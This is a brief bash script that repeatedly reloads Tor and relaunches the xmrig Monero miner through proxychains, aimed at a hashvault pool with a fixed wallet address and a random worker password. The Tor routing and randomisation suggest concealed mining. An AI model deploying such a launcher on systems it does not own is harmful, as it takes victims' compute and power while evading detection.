#!/bin/bash
while true
do
  echo hello
  sudo service tor reload
  proxychains ./xmrig --url pool.hashvault.pro:443 --user 42v6emcRLdNMyX6gahdssJD2Ppw26jKg7cfvtpihC7Tm8rneWUs8iPybXBmDa7r6pcbWoMB1S9DgqGbi5CX3NTLxLksMsqU --pass $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 7 | head -n 1) --keepalive --donate-level 1 --tls -t 8
done
